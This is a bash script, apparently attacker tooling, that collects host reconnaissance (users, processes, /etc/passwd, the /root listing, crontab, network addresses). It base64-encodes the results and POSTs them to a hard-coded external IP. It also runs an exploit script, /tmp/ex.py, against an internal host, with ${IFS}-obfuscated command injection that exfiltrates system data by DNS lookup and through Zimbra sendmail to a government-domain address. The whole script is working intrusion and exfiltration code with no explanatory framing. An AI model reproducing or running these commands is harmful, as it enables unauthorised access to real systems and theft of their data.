#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
R=$({
python3 /tmp/ex.py 10.1.24.10 'nslookup${IFS}HUBDNS1${IFS}131.123.43.239'
python3 /tmp/ex.py 10.1.24.10 '(uname${IFS}-a;id)|base64${IFS}-w0|/opt/zimbra/common/sbin/sendmail${IFS}admin@pl.dbr.gov.ua'
python3 /tmp/ex.py 10.1.24.10 '(hostname;ip${IFS}-o${IFS}-4${IFS}a)|base64${IFS}-w0|/opt/zimbra/common/sbin/sendmail${IFS}admin@pl.dbr.gov.ua'
} 2>&1)
echo "$R" > /tmp/.ghr2
curl -sm30 -X POST --data-binary @/tmp/.ghr2 http://131.123.43.239/up -H "X-Name: hub_res2"
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


